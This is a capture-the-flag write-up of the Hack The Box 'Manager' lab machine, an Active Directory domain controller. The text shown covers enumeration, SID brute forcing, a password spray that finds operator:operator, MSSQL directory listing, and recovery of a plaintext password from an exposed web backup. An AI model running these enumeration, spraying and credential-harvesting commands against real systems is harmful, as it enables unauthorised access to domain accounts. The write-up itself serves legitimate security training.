---
tags:
---
![manager](https://labs.hackthebox.com/storage/avatars/5ca8f0c721a9eca6f1aeb9ff4b4bac60.png)

- Machine : https://app.hackthebox.com/machines/Manager
- Reference : https://0xdf.gitlab.io/2024/03/16/htb-manager.html
- Solved : 2024.11.28. (Thu) (Takes 2days)
### Summary
---
1. **Initial Enumeration**

	- **Open Ports**: Identified critical services such as DNS, HTTP, Kerberos, LDAP, SMB, MSSQL, and WinRM.
	- **DNS Enumeration**:
	    - Discovered the domain `manager.htb` and hostname `dc01.manager.htb`.
	- **SMB**:
	    - Found readable shares, including `SYSVOL`, which provided domain-related files.
    
2. **Web Exploitation**

	- Explored the HTTP service and identified a backup file via directory enumeration.
	- Extracted sensitive information from the backup, including valid user credentials.
	
3. **Service Access**
	
	- **WinRM**:
	    - Used extracted credentials to gain access to the system through WinRM.
	    - 
4. **Privilege Escalation**

	- **MSSQL Exploitation**:
	    - Enumerated directories on the server using MSSQL's `xp_dirtree` feature to find sensitive files.
	- **AD CS Exploitation**:
	    - Leveraged Active Directory Certificate Services (AD CS) misconfiguration (ESC7) to:
	        - Escalate user permissions to enable vulnerable templates.
	        - Request and issue a certificate for a privileged account.
	- **NTLM Hash Abuse**:
	    - Used the issued certificate to retrieve the NTLM hash of a privileged account and authenticate directly.

---

### Key Techniques

- **Enumeration**: Thoroughly enumerated web services, SMB shares, and AD features.
- **AD CS Exploitation**: Identified and abused certificate authority misconfigurations for privilege escalation.
- **Credential Abuse**: Leveraged valid credentials and NTLM hash to gain higher privileges.


# Reconnaissance

### Port Scanning

```yaml
┌──(kali㉿kali)-[~/htb]
└─$ ./port-scan.sh 10.10.11.236
Performing quick port scan on 10.10.11.236...
Found open ports: 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,49667,49689,49690,49693,49724,49791,49875
Performing detailed scan on 10.10.11.236...
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-27 13:27 EST
Nmap scan report for 10.10.11.236
Host is up (0.13s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Manager
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-28 01:28:05Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-11-28T01:29:37+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
|_ssl-date: 2024-11-28T01:29:35+00:00; +7h00m00s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.11.236:1433: 
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.10.11.236:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-11-28T01:13:07
|_Not valid after:  2054-11-28T01:13:07
|_ssl-date: 2024-11-28T01:29:37+00:00; +7h00m00s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-11-28T01:29:37+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-11-28T01:29:35+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49724/tcp open  msrpc         Microsoft Windows RPC
49791/tcp open  msrpc         Microsoft Windows RPC
49875/tcp open  unknown
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-11-28T01:28:57
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.23 seconds
```

Several findings are observed from the scan.
- The domain name is `manager.htb` and `dc01` is exposed.
- Kerberos, LDAP are running which means that it's Domain Controller.
- WinRM might be useful once we obtain any credential.
- http(80) service is running as well.
- ms-sql is running as well which might be interesting.
### dns(53)

```bash
┌──(kali㉿kali)-[~/htb]
└─$ dig any @10.10.11.236 manager.htb

; <<>> DiG 9.20.0-Debian <<>> any @10.10.11.236 manager.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 49861
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;manager.htb.                   IN      ANY

;; ANSWER SECTION:
manager.htb.            600     IN      A       10.10.11.236
manager.htb.            3600    IN      NS      dc01.manager.htb.
manager.htb.            3600    IN      SOA     dc01.manager.htb. hostmaster.manager.htb. 251 900 600 86400 3600

;; ADDITIONAL SECTION:
dc01.manager.htb.       3600    IN      A       10.10.11.236

;; Query time: 128 msec
;; SERVER: 10.10.11.236#53(10.10.11.236) (TCP)
;; WHEN: Wed Nov 27 13:37:12 EST 2024
;; MSG SIZE  rcvd: 138

                                                                           
┌──(kali㉿kali)-[~/htb]
└─$ dig axfr @10.10.11.236 manager.htb

; <<>> DiG 9.20.0-Debian <<>> axfr @10.10.11.236 manager.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

Zone transfer is not allowed, and no further information is found from DNS.

### RPC(135)

```bash
┌──(kali㉿kali)-[~/htb/share_sysvol/manager.htb]
└─$ rpcclient -U '' 10.10.11.236
Password for [WORKGROUP\]:
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
```

It's not accessible with NULL session.

### LDAP(389)

```yaml
┌──(kali㉿kali)-[~/htb]
└─$ ldapsearch -x -H ldap://10.10.11.236 -s base              
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: ALL
#

#
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=manager,DC=htb
ldapServiceName: manager.htb:dc01$@MANAGER.HTB
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
<SNIP>
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=manager,DC=htb
serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configur
 ation,DC=manager,DC=htb
schemaNamingContext: CN=Schema,CN=Configuration,DC=manager,DC=htb
namingContexts: DC=manager,DC=htb
namingContexts: CN=Configuration,DC=manager,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=manager,DC=htb
namingContexts: DC=DomainDnsZones,DC=manager,DC=htb
namingContexts: DC=ForestDnsZones,DC=manager,DC=htb
isSynchronized: TRUE
highestCommittedUSN: 168205
dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,
 CN=Sites,CN=Configuration,DC=manager,DC=htb
dnsHostName: dc01.manager.htb
defaultNamingContext: DC=manager,DC=htb
currentTime: 20241128014849.0Z
configurationNamingContext: CN=Configuration,DC=manager,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

No useful information is found here.

### smb(445)

```vbnet
┌──(kali㉿kali)-[~/htb]
└─$ smbclient -L \\10.10.11.236 -U "guest"
Password for [WORKGROUP\guest]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.236 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

5 shares are found. Not sure they are accessible as NULL session.

### mssql(1433)

```python
┌──(kali㉿kali)-[~/htb]
└─$ sqsh -S 10.10.11.236 -U sa -P ''
sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
Login failed for user 'sa'.
Password: 
```

Ms SQL doesn't allow login without password. Maybe we have to visit it later.

### http(80)

Since we haven't found useful information so far, I expect to have valuable information from http service. Let's visit the main page.

![](attachments/manager_1.png)

I browse the website throughly, but couldn't find anything useful. All links are disabled and no clues for potential users.

##### nikto scan

```bash
┌──(kali㉿kali)-[~/htb]
└─$ nikto -h http://manager.htb
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.11.236
+ Target Hostname:    manager.htb
+ Target Port:        80
+ Start Time:         2024-11-27 14:13:12 (GMT-5)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/10.0
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OPTIONS: Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST .
+ OPTIONS: Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST .
```

Nikto scan find anything useful yet.

##### Directory fuzzing

```bash
┌──(kali㉿kali)-[~/htb]
└─$ gobuster dir -u http://manager.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://manager.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 149] [--> http://manager.htb/images/]
/Images               (Status: 301) [Size: 149] [--> http://manager.htb/Images/]
/css                  (Status: 301) [Size: 146] [--> http://manager.htb/css/]   
/js                   (Status: 301) [Size: 145] [--> http://manager.htb/js/]   
/IMAGES               (Status: 301) [Size: 149] [--> http://manager.htb/IMAGES/]
/CSS                  (Status: 301) [Size: 146] [--> http://manager.htb/CSS/] 
/JS                   (Status: 301) [Size: 145] [--> http://manager.htb/JS/] 
```

##### Subdomain fuzzing

```bash
┌──(kali㉿kali)-[~/htb]
└─$ wfuzz -u http://10.10.11.236 -H "Host: FUZZ.manager.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 18203
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.236/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload   
=====================================================================

000037212:   400        6 L      26 W       334 Ch      "*"  
```

##### Vhost fuzzing

```bash
┌──(kali㉿kali)-[~/htb]
└─$ ffuf -ic -c -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://manager.htb -H 'Host: FUZZ.manager.htb' -fs 18203 -s
```

### smb(445)
##### impacket-lookupsid

```bash
┌──(kali㉿kali)-[~/htb]
└─$ impacket-lookupsid manager.htb@10.10.11.236
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:
[*] Brute forcing SIDs at 10.10.11.236
[*] StringBinding ncacn_np:10.10.11.236[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209
498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: MANAGER\Administrator (SidTypeUser)
501: MANAGER\Guest (SidTypeUser)
502: MANAGER\krbtgt (SidTypeUser)
512: MANAGER\Domain Admins (SidTypeGroup)
513: MANAGER\Domain Users (SidTypeGroup)
514: MANAGER\Domain Guests (SidTypeGroup)
515: MANAGER\Domain Computers (SidTypeGroup)
516: MANAGER\Domain Controllers (SidTypeGroup)
517: MANAGER\Cert Publishers (SidTypeAlias)
518: MANAGER\Schema Admins (SidTypeGroup)
519: MANAGER\Enterprise Admins (SidTypeGroup)
520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
525: MANAGER\Protected Users (SidTypeGroup)
526: MANAGER\Key Admins (SidTypeGroup)
527: MANAGER\Enterprise Key Admins (SidTypeGroup)
553: MANAGER\RAS and IAS Servers (SidTypeAlias)
571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
1000: MANAGER\DC01$ (SidTypeUser)
1101: MANAGER\DnsAdmins (SidTypeAlias)
1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
1113: MANAGER\Zhong (SidTypeUser)
1114: MANAGER\Cheng (SidTypeUser)
1115: MANAGER\Ryan (SidTypeUser)
1116: MANAGER\Raven (SidTypeUser)
1117: MANAGER\JinWoo (SidTypeUser)
1118: MANAGER\ChinHae (SidTypeUser)
1119: MANAGER\Operator (SidTypeUser)
```

Bingo! With lookupsid, the domain users are found. Let me save them to a file for later use.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ cat usernames.txt 
Administrator
Guest 
krbtgt
DC01$
Zhong
Cheng
Ryan 
Raven
JinWoo 
ChinHae
Operator
```

```bash
┌──(kali㉿kali)-[~/htb]
└─$ kerbrute_linux_arm64 userenum -d manager.htb --dc 10.10.11.236 usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 11/27/24 - Ronnie Flathers @ropnop

2024/11/27 14:59:54 >  Using KDC(s):
2024/11/27 14:59:54 >   10.10.11.236:88

2024/11/27 14:59:54 >  [+] VALID USERNAME:       DC01$@manager.htb
2024/11/27 14:59:54 >  [+] VALID USERNAME:       Zhong@manager.htb
2024/11/27 14:59:54 >  [+] VALID USERNAME:       Administrator@manager.htb
2024/11/27 14:59:54 >  [+] VALID USERNAME:       Cheng@manager.htb
2024/11/27 14:59:54 >  [+] VALID USERNAME:       ChinHae@manager.htb
2024/11/27 14:59:54 >  [+] VALID USERNAME:       Raven@manager.htb
2024/11/27 14:59:54 >  [+] VALID USERNAME:       Operator@manager.htb
2024/11/27 14:59:54 >  Done! Tested 11 usernames (7 valid) in 0.267 seconds
```

Double Check! As of now, let's try password spray attack using the list. There might be users whoc are using their username as their password.

##### Password spray attack

```bash
┌──(kali㉿kali)-[~/htb]
└─$ crackmapexec smb 10.10.11.236 -u usernames_lower.txt -p usernames_lower.txt

<SNIP>
SMB         10.10.11.236    445    DC01             [-] manager.htb\operator:cheng STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\operator:ryan STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\operator:raven STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\operator:jinwoo STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\operator:chinhae STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator 
```

The password spray attack shows valid credential : `operator` : `operator`.
Let's test it with `crackmapexec`.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ crackmapexec smb 10.10.11.236 -u operator -p operator   
SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator 

┌──(kali㉿kali)-[~/htb]
└─$ crackmapexec winrm 10.10.11.236 -u operator -p operator
SMB         10.10.11.236    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
HTTP        10.10.11.236    5985   DC01             [*] http://10.10.11.236:5985/wsman
WINRM       10.10.11.236    5985   DC01             [-] manager.htb\operator:operator
```

The credential is correct, but cannot use it to `winrm`..

##### Shares

```bash
┌──(kali㉿kali)-[~/htb]
└─$ crackmapexec smb 10.10.11.236 -u operator -p operator --shares
SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator 
SMB         10.10.11.236    445    DC01             [+] Enumerated shares
SMB         10.10.11.236    445    DC01             Share           Permissions     Remark
SMB         10.10.11.236    445    DC01             -----           -----------     ------
SMB         10.10.11.236    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.236    445    DC01             C$                              Default share
SMB         10.10.11.236    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.236    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.236    445    DC01             SYSVOL          READ            Logon server share
```

With the found credential, I can list the shares.
There are 5 shares found in total, and `IPC$`, `NETLOGON`, `SYSVOL` are readable.
Let's take a look at all these shares.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ smbclient \\\\10.10.11.236\\IPC$ -U 'manager.htb\operator'
Password for [MANAGER.HTB\operator]:
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_NO_SUCH_FILE listing \*


┌──(kali㉿kali)-[~/htb]
└─$ smbclient \\\\10.10.11.236\\NETLOGON -U 'manager.htb\operator'
Password for [MANAGER.HTB\operator]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul 27 06:19:07 2023
  ..                                  D        0  Thu Jul 27 06:19:07 2023

5446399 blocks of size 4096. 663915 blocks available


┌──(kali㉿kali)-[~/htb]
└─$ smbclient \\\\10.10.11.236\\SYSVOL -U 'manager.htb\operator'
Password for [MANAGER.HTB\operator]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul 27 06:19:07 2023
  ..                                  D        0  Thu Jul 27 06:19:07 2023
  manager.htb                        Dr        0  Thu Jul 27 06:19:07 2023

5446399 blocks of size 4096. 663915 blocks available
```

Only `SYSVOL` share have some data. Let's download it.

```bash
┌──(kali㉿kali)-[~/htb/share_sysvol]
└─$ smbclient \\\\10.10.11.236\\SYSVOL -U 'manager.htb\operator'
Password for [MANAGER.HTB\operator]:
Try "help" to get a list of possible commands.
smb: \> prompt off
smb: \> recurse on
smb: \> mget *

NT_STATUS_ACCESS_DENIED listing \manager.htb\DfsrPrivate\*
getting file \manager.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as manager.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \manager.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as manager.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \manager.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2790 as manager.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (5.2 KiloBytes/sec) (average 1.8 KiloBytes/sec)
getting file \manager.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1264 as manager.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (2.4 KiloBytes/sec) (average 1.9 KiloBytes/sec)
getting file \manager.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 4938 as manager.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (9.3 KiloBytes/sec) (average 3.4 KiloBytes/sec)
```

```bash
┌──(kali㉿kali)-[~/htb/share_sysvol/manager.htb]
└─$ tree                                                    
.
├── DfsrPrivate
├── Policies
│   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
│   │   ├── GPT.INI
│   │   ├── MACHINE
│   │   │   ├── Microsoft
│   │   │   │   └── Windows NT
│   │   │   │       └── SecEdit
│   │   │   │           └── GptTmpl.inf
│   │   │   ├── Registry.pol
│   │   │   └── Scripts
│   │   │       ├── Shutdown
│   │   │       └── Startup
│   │   └── USER
│   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
│       ├── GPT.INI
│       ├── MACHINE
│       │   └── Microsoft
│       │       └── Windows NT
│       │           └── SecEdit
│       │               └── GptTmpl.inf
│       └── USER
└── scripts

19 directories, 5 files
```

No useful information is found here. I think it's time to move to other services.
With the owned credential, let's try to access other services..

##### Password policy

```bash
┌──(kali㉿kali)-[~/htb/share_sysvol/manager.htb]
└─$ ldapsearch -x -H ldap://10.10.11.236 -D "operator@manager.htb" -w 'operator' -b "dc=manager,dc=htb" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength 
forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 0
maxPwdAge: -36288000000000
minPwdAge: -864000000000
minPwdLength: 7
modifiedCountAtLastProm: 0
nextRid: 1000
pwdProperties: 0
pwdHistoryLength: 24
```

##### Kerberoasting & AS-REProasting & Secretsdump

```bash
┌──(kali㉿kali)-[~/htb/share_sysvol/manager.htb]
└─$ impacket-GetUserSPNs manager.htb/operator:'operator' -dc-ip 10.10.11.236
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

No entries found!

┌──(kali㉿kali)-[~/htb/share_sysvol/manager.htb]
└─$ impacket-GetNPUsers manager.htb/operator:'operator' -dc-ip 10.10.11.236
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

No entries found!

┌──(kali㉿kali)-[~/htb/share_sysvol/manager.htb]
└─$ impacket-secretsdump manager.htb/operator:operator@10.10.11.236
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
[*] Cleaning up... 
```

None of these are working..
I think usual AD attack methods are not working for now.
Let's tamper MS SQL this time.


# Shell as `raven`

```bash
┌──(kali㉿kali)-[~/htb/share_sysvol/manager.htb]
└─$ impacket-mssqlclient manager.htb/operator:operator@10.10.11.236 -windows-auth
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (MANAGER\Operator  guest@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    show_query                 - show query
    mask_query                 - mask query
    
SQL (MANAGER\Operator  guest@master)> enable_xp_cmdshell
ERROR: Line 1: You do not have permission to run the RECONFIGURE statement.
```

It's working with `impacket-mssqlcient`. 
But `xp_cmdshell` command is not working. I tried `enable_xp_cmdshell`, but it was not allowed.
Let's try with different command `xp_dirtree`.

```sql
SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\
subdirectory                depth   file   
-------------------------   -----   ----   
$Recycle.Bin                    1      0   
Documents and Settings          1      0   
inetpub                         1      0   
PerfLogs                        1      0   
Program Files                   1      0   
Program Files (x86)             1      0   
ProgramData                     1      0   
Recovery                        1      0   
SQL2019                         1      0   
System Volume Information       1      0   
Users                           1      0   
Windows                         1      0   

SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub\wwwroot
subdirectory                      depth   file   
-------------------------------   -----   ----   
about.html                            1      1   
contact.html                          1      1   
css                                   1      0   
images                                1      0   
index.html                            1      1   
js                                    1      0   
service.html                          1      1   
web.config                            1      1   
website-backup-27-07-23-old.zip       1      1
```

Since the file is located on the same folder with web source files, I think we can directly access to this file through http(80) method.
Let's download the backup file and see what's in it.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ wget http://manager.htb/website-backup-27-07-23-old.zip
--2024-11-28 06:59:27--  http://manager.htb/website-backup-27-07-23-old.zip
Resolving manager.htb (manager.htb)... 10.10.11.236
Connecting to manager.htb (manager.htb)|10.10.11.236|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1045328 (1021K) [application/x-zip-compressed]
Saving to: ‘website-backup-27-07-23-old.zip’

website-backup-27- 100%[===============>]   1021K   234KB/s    in 6.6s    

2024-11-28 06:59:34 (154 KB/s) - ‘website-backup-27-07-23-old.zip’ saved [1045328/1045328]


┌──(kali㉿kali)-[~/htb/backup]
└─$ grep -i 'password' -r .

./js/jquery-3.4.1.min.js:!function(e,t){"use strict";"object"==typeof modul
<SNIP>
./.old-conf.xml:         <password>R4v3nBe5tD3veloP3r!123</password>

┌──(kali㉿kali)-[~/htb/backup]
└─$ cat .old-conf.xml 
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>
```

Here I can find `raven`'s password : `R4v3nBe5tD3veloP3r!123`
Let's test what I can do with this credential.

```bash
┌──(kali㉿kali)-[~/htb/backup]
└─$ crackmapexec smb 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'
SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 

